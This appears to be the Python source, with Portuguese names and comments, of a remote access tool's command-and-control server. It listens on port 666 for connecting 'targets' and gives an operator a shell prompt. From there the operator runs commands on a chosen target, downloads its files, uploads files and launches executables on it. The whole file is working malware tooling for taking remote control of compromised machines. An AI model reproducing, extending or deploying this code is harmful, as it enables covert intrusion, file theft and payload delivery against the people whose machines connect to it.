import socket, threading, os, base64

conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conexao.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
ip = '0.0.0.0'
port = 666

conexao.bind((ip, port))
conexao.listen(1)
print(f'listening on [{ip}] {port}\n')

class Alvo:
    def __init__(self, nome, sock: socket):
        self.nome = nome
        self.sock: socket = sock

def to_listen():
    while True:
        sock, host = conexao.accept()
        nome = sock.recv(1024).decode('utf-8')
        alvo = Alvo(nome, sock)
        alvos.append(alvo)

alvos = []
index = ''

threading.Thread(target=to_listen).start()
try:
    while True:
        try:
            comando = input('shell@lister~$ ')
            if comando == '':
                pass
            elif comando == 'end':
                conexao.close()
            elif comando == 'alvos':
                if len(alvos) > 0:
                    print('\nID\tNOME')
                    for x, y in enumerate(alvos):
                        print(f'{x}\t{y.nome}\n')
                else:
                    print('Nenhum alvo conectado.')
            elif comando.startswith('alvo'):
                try:
                    print(abs(int(comando.split()[1])))
                    index = abs(int(comando.split()[1]))
                    if index > len(alvos) - 1:
                        print('ID invalido')
                        del index
                except (IndexError, ValueError):
                    print('Selecione o alvo pelo ID')
            elif comando.startswith('download'):
                try:
                    nome_arquivo = comando.split()[1]
                    result = ''
                    downloaded = True
                    print('Aguarde o fim do download. . .')
                    alvos[index].sock.send(('download '+nome_arquivo).encode('utf-8'))
                    while True:
                        result2 = alvos[index].sock.recv(1024).decode('utf-8')
                        result += result2
                        if not result2:
                            raise socket.error
                        elif '\\' in result2:
                            print('Arquivo nao encotrado - download cancelado')
                            downloaded = False
                            break
                        elif '\n' in result2:
                            break
                    if downloaded:
                        with open(os.path.basename(nome_arquivo), 'ab') as arquivo:
                            conteudo = base64.b64decode(result.encode('utf-8'))
                            arquivo.write(conteudo)
                        print('\nDownload concluido')
                except IndexError:  # 35
                    print('Uso: download arquivo_remoto')
            elif comando.startswith('upload'):
                try:
                    arquivo_local = comando.split()[1]
                    arquivo_remoto = comando.split()[2]
                    content = ''
                    with open(arquivo_local, 'rb') as arquivo:
                        content = base64.b64encode(arquivo.read()).decode('utf-8') + '\n'
                    alvos[index].sock.send(('upload '+arquivo_remoto).encode('utf-8'))
                    print("Aguarde o fim do upload. . .")
                    y = 0
                    while y < len(content):
                        alvos[index].sock.send(content[y:y+1024].encode('utf-8'))
                        y += 1024
                    alvos[index].sock.sendall((base64.b64encode(content).decode('utf-8') + '\n').encode('utf-8'))
                    resp = alvos[index].sock.recv(26).decode('utf-8')
                    if '\r' in resp:
                        print(alvos[index].sock.recv(26).decode('utf-8'))
                    else:
                        print(resp)
                except IndexError:
                    print('Uso: upload arquivo_local arquivo_remoto')
                except IOError:  # 47
                    print('Arquivo local nao encontrado ou alvo desconectado')
            elif comando.startswith('exec'):
                try:
                    cmd = comando.split()[1:]
                    if len(cmd) == 0:
                        raise IndexError
                    alvos[index].sock.send(comando.encode('utf-8'))
                except IndexError:
                    print('Uso: exec arquivo (parametros)')
                    print('Exemplo: exec sshd.exe -d')
                else:
                    result = alvos[index].sock.recv(28).decode('utf-8')
                    if not result:
                        raise socket.error
                    elif '\r' in result:
                        print(alvos[index].sock.recv(28).decode('utf-8'))
                    else:
                        print(result)
            else:
                alvos[index].sock.send(comando.encode('utf-8'))
                result = ''
                while True:
                    # caso seja executado notepad.exe, cmd.exe ou powershell.exe
                    # o servidor ficará aguardando
                    # por 1024 bytes de resposta do cliente
                    # Será necessário encerrar o nteopad no alvo
                    # para que o servidor 'descongele'
                    # Para executar um arquivo, uso o módulo exec
                    result2 = alvos[index].sock.recv(1024).decode('utf-8')
                    result += result2
                    if not result2:
                        raise socket.error
                    elif result2[-1] == '\n':
                        break
                print(base64.b64decode(result.encode('utf-8')).decode('utf-8'))
        except NameError:
            print('Alvo nao definido')
        except socket.error:
            print('Alvo invalido, selecione outro')
            alvos[index].sock.close()
            del alvos[index]
            del index
        except KeyboardInterrupt:
            print('Ctr+c pressionado, excluindo alvo atual')
            try:
                alvos[index].sock.close()
                del alvos[index]
                del index
            except NameError:
                pass
finally:
    alvos[index].sock.close()
    del alvos[index]
    del index
    conexao.close()
